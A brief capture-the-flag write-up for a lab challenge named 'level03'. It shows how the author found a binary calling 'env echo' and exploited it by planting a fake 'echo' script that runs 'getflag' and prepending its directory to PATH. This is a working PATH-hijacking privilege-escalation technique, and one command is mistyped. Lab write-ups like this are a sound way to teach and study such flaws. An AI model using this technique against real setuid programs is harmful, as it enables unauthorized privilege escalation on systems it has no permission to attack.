# We found a binary: ./level03
# The binary print 'Exploit me'
# We dump the binary:
hexdump ./level03 -C

# We found: /usr/bin/env echo Exploit me

# So we thinked that the vurnability is to make the program use our 'homemade echo' XD
chomod 777 .
echo 'getflag' > echo
chmod +x echo
export PATH=/home/user/level03/:$PATH

# We launched again ./level03
# And TADAAAAAAAA
